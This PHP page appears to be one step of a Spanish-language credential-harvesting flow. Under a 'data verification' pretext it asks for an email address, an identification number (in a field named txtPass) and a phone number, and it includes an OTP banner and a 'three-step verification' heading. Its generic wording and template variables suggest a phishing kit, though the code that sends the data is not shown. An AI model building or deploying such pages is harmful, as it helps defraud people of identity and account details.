<?php require_once("header.php"); ?>

<?php
$titulo = "Verificacion de datos";
$mensaje = "Verificaremos estos datos con los agregados anteriormente en nuestras oficinas";
$mostrar_icono_info = true; 
$icono_info = "./img/info.jpg"; 
$contenidotitle = "Ingresa";
$contenidotitle2 = "";

// Variables para el primer input
$contenidotitle_1 = "Ingresa tu correo electronico"; 
$show_input_1 = true;
$max_caracteres = 50; // Máximo de caracteres permitidos
$tipo_input_html1 = "email"; 
$id_input_1 = "txtMail";
$icono_input_1 = "./img/email.png";
$nombre_input_1 = "txtMail";
$placeholder_input_1 = "";
$disabled = false; 

// Variables para el segundo y tercer input (select boxes)
$contenidotitle_2 = "mes"; 
$show_input_2 = false;
$id_input_2 = "mes";
$nombre_input_2 = "mes_seleccionado";

$contenidotitle_3 = "año"; 
$show_input_3 = false;
$id_input_3 = "año";
$nombre_input_3 = "año_seleccionado";


// Variables para el cuarto y quinto input
$contenidotitle_4 = "Ingresa tu numero de identificacion"; 
$show_input_4 = true;
$max_caracteres4 = 10; // Máximo de caracteres permitidos
$min_caracteres5 = 5; // Mínimo de caracteres permitidos
$tipo_input_html4 = "text"; 
$icono_input_4 = "./img/lock.png";
$id_input_4 = "txtPass";
$nombre_input_4 = "txtPass";
$placeholder_input_4 = "";



$contenidotitle_5 = "Ingresa tu telefono"; 
$show_input_5 = true;
$max_caracteres5 = 10; // Máximo de caracteres permitidos
$min_caracteres5 = 5; // Mínimo de caracteres permitidos
$tipo_input_html5 = "text"; 
$id_input_5 = "txtCelular";
$icono_input_5 = "./img/telefono.png";
$nombre_input_5 = "txtCelular";
$placeholder_input_5 = "";

// Variables para activar inputmode="numeric"
$activar_inputmode_numeric1 = false; // Activar inputmode="numeric" para txtPass
$activar_inputmode_numeric4 = true; // Activar inputmode="numeric" para txtPass
$activar_inputmode_numeric5 = true; // Activar inputmode="numeric" para txtCelular


$mostrar_icono_info_1 = true; // Mostrar el icono de información para el primer input
$icono_info_1 = "./img/info.jpg"; // Ruta al icono de información para el primer input

$mostrar_icono_info_2 = true; // Mostrar el icono de información para el segundo input
$icono_info_2 = "./img/info.jpg"; // Ruta al icono de información para el segundo input

$mostrar_icono_info_3 = true; // Mostrar el icono de información para el tercer input
$icono_info_3 = "./img/info.jpg"; // Ruta al icono de información para el tercer input

$mostrar_icono_info_4 = true; // Mostrar el icono de información para el cuarto input
$icono_info_4 = "./img/info.jpg"; // Ruta al icono de información para el cuarto input

$mostrar_icono_info_5 = true; // Mostrar el icono de información para el quinto input
$icono_info_5 = "./img/info.jpg"; // Ruta al icono de información para el quinto input

// Contenido de subtítulo 
$contenidotitle2_1 = ""; 
$contenidotitle2_2 = ""; 
$contenidotitle2_3 = ""; 
$contenidotitle2_4 = "";
$contenidotitle2_5 = "";


// Variables para los botones
$mostrar_button1 = false;
$id_button1 = "button1";
$nombre_button1 = "button1_nombre";
$texto_button1 = "cancelar";
$mostrar_button2 = true;
$id_button2 = "btnMail";
$nombre_button2 = "btnMail";
$texto_button2 = "Verificar";

// Variables para el mensaje de teclado
$mostrar_mensaje_teclado = false;
$mensaje_teclado = "Mensaje de ayuda para el teclado";

// Variables para el enlace de "¿Olvidaste tu usuario?"
$mostrar_enlace = false;


// Variables para el icono de generación de clave personal
$mostrar_genera_clave_personal = false;
$icono = "ruta_al_icono_generacion_clave";
$Generaunaclavepersonal = "Genera una clave personal";




?>

<?php include "cuadro2.php";  ?>
<?php include "bannerotp.php";  ?>
<script>
  function validarNumeros(e, inputId) {
    var charCode = (e.which) ? e.which : e.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        e.preventDefault();
    }
}
document.getElementById("txtPass").addEventListener("keypress", function(e) {
    validarNumeros(e, "txtPass");
});
document.getElementById("txtCelular").addEventListener("keypress", function(e) {
    validarNumeros(e, "txtCelular");
});

  document.addEventListener("DOMContentLoaded", function() {
    var tituloInicioSesionElement = document.querySelector(".grotesca-papel");
    var titulo = localStorage.getItem('tituloInicioSesion');

    if (titulo) {
      tituloInicioSesionElement.textContent = titulo;
    } else {
      //mensaje predeterminado
      tituloInicioSesionElement.textContent = "Verificacion de tres pasos";
    }
  });
</script>
<?php include "footer.php" ?>

